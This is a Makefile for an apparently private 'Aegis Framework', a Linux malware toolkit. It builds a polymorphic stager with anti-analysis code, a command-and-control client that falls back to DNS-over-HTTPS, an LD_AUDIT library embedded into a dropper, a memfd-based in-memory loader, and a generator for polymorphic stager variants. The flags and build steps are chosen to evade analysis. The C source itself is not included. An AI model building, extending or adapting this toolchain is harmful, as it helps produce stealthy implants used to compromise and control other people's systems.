# ============================================================================
#  AEGIS FRAMEWORK — Top-Level Makefile
# ============================================================================
#  Classification : PRIVATE — LO/ENI EYES ONLY
#  Purpose        : Build all Aegis components for Linux x86_64.
#
#  Targets:
#    all           — Build everything
#    stager        — Build the polymorphic stager (static, stripped)
#    catalyst      — Build the environment catalyst
#    nexus_auditor — Build the LD_AUDIT shared library
#    ghost_loader  — Build the in-memory Ghost Loader
#    clean         — Remove all build artifacts
#    generate      — Run the Stager Generation Engine
#
#  Compiler Notes:
#    - stager: compiled static + stripped (no dynamic deps)
#    - nexus_auditor: compiled as shared library (-shared -fPIC)
#    - ghost_loader: compiled static (runs from memfd)
#    - catalyst: compiled static + stripped
# ============================================================================

# ── Toolchain ────────────────────────────────────────────────────────────────

CC       ?= gcc
CFLAGS   := -Wall -Wextra -Werror -std=gnu11 -D_GNU_SOURCE
CFLAGS   += -fno-stack-protector -fno-ident -fvisibility=hidden
CFLAGS   += -fno-asynchronous-unwind-tables
LDFLAGS  := -lssl -lcrypto -lpthread -ldl -lz
PIC_FLAGS := -fPIC

# Build mode: debug or release
MODE     ?= release
ifeq ($(MODE),debug)
    CFLAGS += -O0 -g -DAEIGIS_DEBUG
else
    CFLAGS += -O2
endif

# Allow extra flags from command line
CFLAGS += $(EXTRA_CFLAGS)

# ── Directories ──────────────────────────────────────────────────────────────

BUILD_DIR  := build
COMMON_DIR := common
C2_DIR     := c2_comms
STAGER_DIR := stager
CAT_DIR    := catalyst
NEXUS_DIR  := nexus_auditor
NANO_DIR   := nanomachine
GHOST_DIR  := ghost_loader
GEN_DIR    := gen_engine

# ── Source Files ─────────────────────────────────────────────────────────────

COMMON_SRC := $(COMMON_DIR)/logging.c \
              $(COMMON_DIR)/loader.c

C2_SRC     := $(C2_DIR)/crypto.c \
              $(C2_DIR)/c2_client.c

STAGER_SRC := $(STAGER_DIR)/stager.c \
              $(STAGER_DIR)/anti_analysis.c

CAT_SRC    := $(CAT_DIR)/catalyst.c

NEXUS_SRC  := $(NEXUS_DIR)/nexus_auditor.c \
              $(NEXUS_DIR)/alpha_node.c \
              $(NEXUS_DIR)/beta_node.c

NANO_SRC   := $(NANO_DIR)/vault.c \
              $(NANO_DIR)/nanomachine.c

GHOST_SRC  := $(GHOST_DIR)/ghost_loader.c

# ── Output Binaries ─────────────────────────────────────────────────────────

STAGER_BIN    := $(BUILD_DIR)/aegis_stager
CATALYST_BIN  := $(BUILD_DIR)/aegis_catalyst
NEXUS_SO      := $(BUILD_DIR)/nexus_auditor.so
GHOST_BIN     := $(BUILD_DIR)/aegis_ghost_loader

# ── Include Paths ────────────────────────────────────────────────────────────

INCLUDES := -I$(COMMON_DIR) -I$(C2_DIR) -I$(STAGER_DIR) \
            -I$(NEXUS_DIR) -I$(NANO_DIR) -I$(GHOST_DIR)

# ── Targets ──────────────────────────────────────────────────────────────────

.PHONY: all stager catalyst nexus_auditor ghost_loader clean generate

all: $(BUILD_DIR) stager catalyst nexus_auditor ghost_loader
	@echo ""
	@echo "═══════════════════════════════════════════════════════"
	@echo " AEGIS FRAMEWORK — Build Complete"
	@echo "═══════════════════════════════════════════════════════"
	@echo " Stager:        $(STAGER_BIN)"
	@echo " Catalyst:      $(CATALYST_BIN)"
	@echo " Nexus Auditor: $(NEXUS_SO)"
	@echo " Ghost Loader:  $(GHOST_BIN)"
	@echo "═══════════════════════════════════════════════════════"

$(BUILD_DIR):
	@mkdir -p $(BUILD_DIR)

# ── Stager (static, stripped) ────────────────────────────────────────────────

stager: $(BUILD_DIR)
	$(CC) $(CFLAGS) -static -s \
		$(INCLUDES) \
		$(STAGER_SRC) $(COMMON_SRC) $(C2_SRC) \
		-o $(STAGER_BIN) \
		-lssl -lcrypto -lpthread -ldl
	@echo "[+] Stager built: $(STAGER_BIN) ($$(stat -c%s $(STAGER_BIN)) bytes)"
	@echo "[*] DNS: Built-in DoH fallback resolver active (resolves via Cloudflare/Google/Quad9)"
	@echo "[*] C2:  Primary=$(shell grep 'AEGIS_C2_PRIMARY_HOST' common/config.h | head -1 | sed 's/.*\"\(.*\)\"/\1/')"
	@echo "[*] Port: $(shell grep 'AEGIS_C2_PRIMARY_PORT' common/config.h | head -1 | awk '{print $$3}')"
	@sha256sum $(STAGER_BIN)

stager-musl: $(BUILD_DIR)
	musl-gcc $(CFLAGS) -static -s \
		$(INCLUDES) \
		$(STAGER_SRC) $(COMMON_SRC) $(C2_SRC) \
		-o $(STAGER_BIN) \
		-lssl -lcrypto -lpthread
	@echo "[+] Stager (musl) built: $(STAGER_BIN)"
	@echo "[*] DNS: DoH fallback active — no NSS dependency"

# ── Nexus Auditor (shared library) ──────────────────────────────────────────

nexus_auditor: $(BUILD_DIR)
	$(CC) $(CFLAGS) $(PIC_FLAGS) -shared \
		$(INCLUDES) \
		$(NEXUS_SRC) $(COMMON_SRC) $(C2_SRC) \
		-o $(NEXUS_SO) \
		-lssl -lcrypto -lpthread -ldl
	@echo "[+] Nexus Auditor built: $(NEXUS_SO)"

# ── Catalyst (static, stripped) ──────────────────────────────────────────────

catalyst: $(BUILD_DIR) nexus_auditor
	objcopy -I binary -O elf64-x86-64 -B i386:x86-64 $(NEXUS_SO) build/nexus_auditor.o
	$(CC) $(CFLAGS) -static -s \
		$(INCLUDES) \
		$(CAT_SRC) $(COMMON_SRC) $(C2_SRC) build/nexus_auditor.o \
		-o $(CATALYST_BIN) \
		-lssl -lcrypto -lpthread
	@echo "[+] Catalyst built: $(CATALYST_BIN)"

# ── Ghost Loader (static — runs from memfd) ─────────────────────────────────

ghost_loader: $(BUILD_DIR)
	$(CC) $(CFLAGS) -static -s \
		$(INCLUDES) \
		$(GHOST_SRC) $(COMMON_SRC) $(C2_SRC) $(NANO_SRC) \
		-o $(GHOST_BIN) \
		$(LDFLAGS) -ldl
	@echo "[+] Ghost Loader built: $(GHOST_BIN)"

# ── Stager Generation Engine ────────────────────────────────────────────────

generate:
	@echo "[*] Running Stager Generation Engine..."
	python3 $(GEN_DIR)/gen_engine.py \
		--template $(STAGER_DIR)/stager.c \
		--output $(BUILD_DIR)/polymorphic_stager \
		--count 5 \
		--log-dir $(BUILD_DIR)/gen_logs
	@echo "[+] Generation complete. Check $(BUILD_DIR)/gen_logs/"

# ── Clean ────────────────────────────────────────────────────────────────────

clean:
	rm -rf $(BUILD_DIR)
	@echo "[+] Build artifacts cleaned"
